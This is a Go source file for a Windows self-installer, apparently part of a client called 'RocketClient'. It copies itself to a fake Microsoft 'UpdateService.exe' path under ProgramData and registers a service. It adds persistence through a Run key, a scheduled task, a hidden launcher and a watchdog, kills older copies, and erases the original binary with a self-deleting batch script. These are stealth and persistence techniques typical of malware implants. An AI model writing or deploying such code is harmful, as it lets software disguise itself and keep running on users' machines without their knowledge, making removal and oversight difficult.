//go:build windows

package lifecycle

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/kataras/golog"
	"golang.org/x/sys/windows"
)

// WindowsInstaller handles self-installation on Windows
type WindowsInstaller struct{}

const installMutexName = `Global\RocketClientInstallMutex`

// NewInstaller creates a new Windows installer
func NewInstaller() *WindowsInstaller {
	return &WindowsInstaller{}
}

// GetInstallPath returns the target installation path
func (w *WindowsInstaller) GetInstallPath() string {
	programData := os.Getenv("ProgramData")
	if programData == "" {
		programData = `C:\ProgramData`
	}
	return filepath.Join(programData, "Microsoft", "Update", "UpdateService.exe")
}

// IsInstalled checks if the service is already installed
func (w *WindowsInstaller) IsInstalled() bool {
	installPath := w.GetInstallPath()
	golog.Infof("installer: checking if installed at %s", installPath)

	if _, err := os.Stat(installPath); err != nil {
		golog.Info("installer: binary not found, not installed")
		return false
	}
	golog.Info("installer: binary exists, checking service status")

	ctrl := NewServiceController(installPath)
	status, err := ctrl.Status()
	if err != nil {
		golog.Warnf("installer: service status check failed: %v", err)
		golog.Warn("installer: cleaning up stale binary")
		_ = os.Remove(installPath)
		return false
	}

	golog.Infof("installer: service status: %s", status)
	if status == "unknown" {
		golog.Warn("installer: service status unknown, cleaning up stale binary")
		_ = os.Remove(installPath)
		return false
	}

	golog.Info("installer: service is installed and registered")
	return true
}

// Install performs the self-installation
func (w *WindowsInstaller) Install() error {
	// Ensure single installer at a time across processes.
	release, err := acquireInstallMutex(20 * time.Second)
	if err != nil {
		return fmt.Errorf("installer: could not acquire install mutex: %w", err)
	}
	defer release()

	// Require elevation for any install attempt
	if !isProcessElevated() {
		return errors.New("installer: requires administrative privileges")
	}

	golog.Info("installer: starting Windows install sequence")
	// 1. Get current executable path
	selfPath, err := os.Executable()
	if err != nil {
		return err
	}

	// 2. Create install directory
	installPath := w.GetInstallPath()
	installDir := filepath.Dir(installPath)
	if err := os.MkdirAll(installDir, 0755); err != nil {
		return err
	}

	// 2a. Proactively disable persistence/watchdog and stop any running old service/UI helpers
	w.cleanOldInstall()

	// Ensure any previous disable flag is cleared for fresh install
	_ = os.Remove(persistenceFlagPath(installPath))

	// 3. Copy executable to install location
	selfBytes, err := os.ReadFile(selfPath)
	if err != nil {
		return err
	}
	if err := os.WriteFile(installPath, selfBytes, 0755); err != nil {
		return err
	}

	// 4. Create service controller for installed path
	svcCtrl := NewServiceController(installPath)

	// 5. Install service
	golog.Info("installer: registering Windows service")
	if err := svcCtrl.Install(); err != nil {
		// Check if service already exists by examining error message
		if strings.Contains(err.Error(), "already exists") || strings.Contains(err.Error(), "already installed") {
			golog.Warn("installer: service already exists, continuing")
		} else {
			return err
		}
	} else {
		golog.Info("installer: service registration successful")
	}

	// 6. Configure persistence (Run key + scheduled task) using hidden launcher to avoid console flash
	ensureRunKey(installPath)
	ensureScheduledTask(installPath)

	// 7. Start service
	golog.Info("installer: starting Windows service")
	if err := svcCtrl.Start(); err != nil {
		return err
	}

	// 8. Schedule deletion of the installer binary if different from install target
	if selfPath != installPath {
		scheduleSelfDelete(selfPath)
	}
	return nil
}

func setRunKey(path string) {
	setRunKeyRoots(path)
}

// cleanOldInstall disables persistence/watchdog, stops the service, and cleans scheduled tasks/run keys
// so a new install can take over cleanly even if an old binary is running.
func (w *WindowsInstaller) cleanOldInstall() {
	installPath := w.GetInstallPath()
	binaryName := filepath.Base(installPath)

	golog.Info("installer: pre-cleaning existing install (disable persistence, stop service, remove tasks/run keys)")

	// Disable persistence/watchdog flags so Stop will take effect.
	DisablePersistence(installPath)

	// Best-effort stop via SCM.
	ctrl := NewServiceController(installPath)
	if err := ctrl.Stop(); err != nil {
		golog.Warnf("installer: service stop returned error (may be okay): %v", err)
	}

	// Wait briefly for service to report stopped
	waitForServiceState(ctrl, "stopped", 10*time.Second)

	// Kill stray processes by name (covers UI helpers launched in user sessions).
	_ = exec.Command("taskkill", "/F", "/IM", binaryName, "/T").Run()

	// Remove scheduled task + Run keys to prevent immediate respawn.
	clearRunKeyRoots()
	removeScheduledTask()

	// Best-effort uninstall of existing service registration (in case of stale/broken entries).
	if err := ctrl.Uninstall(); err != nil {
		golog.Warnf("installer: service uninstall returned error (may be okay): %v", err)
	}

	// Brief pause to allow SCM/process teardown.
	time.Sleep(2 * time.Second)
}

// waitForServiceState polls the service controller until the desired state or timeout.
func waitForServiceState(ctrl ServiceController, desired string, timeout time.Duration) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		status, err := ctrl.Status()
		if err == nil && strings.EqualFold(status, desired) {
			return
		}
		time.Sleep(500 * time.Millisecond)
	}
}

// acquireInstallMutex obtains a cross-process mutex to avoid concurrent installs/updates.
func acquireInstallMutex(timeout time.Duration) (func(), error) {
	name, _ := windows.UTF16PtrFromString(installMutexName)
	h, err := windows.CreateMutex(nil, false, name)
	if err != nil {
		return nil, err
	}
	wait, err := windows.WaitForSingleObject(h, uint32(timeout.Milliseconds()))
	if err != nil {
		// WAIT_TIMEOUT is returned as an error in newer Go versions
		if err == windows.WAIT_TIMEOUT {
			windows.CloseHandle(h)
			return nil, errors.New("install mutex wait timed out")
		}
		windows.CloseHandle(h)
		return nil, err
	}
	switch wait {
	case uint32(windows.WAIT_OBJECT_0), uint32(windows.WAIT_ABANDONED):
		// Acquired
	default:
		windows.CloseHandle(h)
		return nil, fmt.Errorf("install mutex wait failed: %x", wait)
	}
	return func() {
		_ = windows.ReleaseMutex(h)
		_ = windows.CloseHandle(h)
	}, nil
}

func scheduleSelfDelete(path string) {
	if path == "" {
		return
	}
	for i := 0; i < 3; i++ {
		batch := filepath.Join(os.TempDir(), "svc_cleanup.bat")
		contents := "@echo off\r\n" +
			"ping 127.0.0.1 -n 3 >nul\r\n" +
			"del /f /q \"" + path + "\"\r\n" +
			"del /f /q \"%~f0\"\r\n"
		if err := os.WriteFile(batch, []byte(contents), 0600); err != nil {
			continue
		}
		if exec.Command("cmd.exe", "/C", batch).Start() == nil {
			break
		}
	}
}

// Remove deletes the installed binary and clears the Run key entry (best-effort).
func (w *WindowsInstaller) Remove() error {
	installPath := w.GetInstallPath()
	if installPath != "" {
		_ = os.Remove(installPath)
	}

	clearRunKeyRoots()
	removeScheduledTask()
	return nil
}
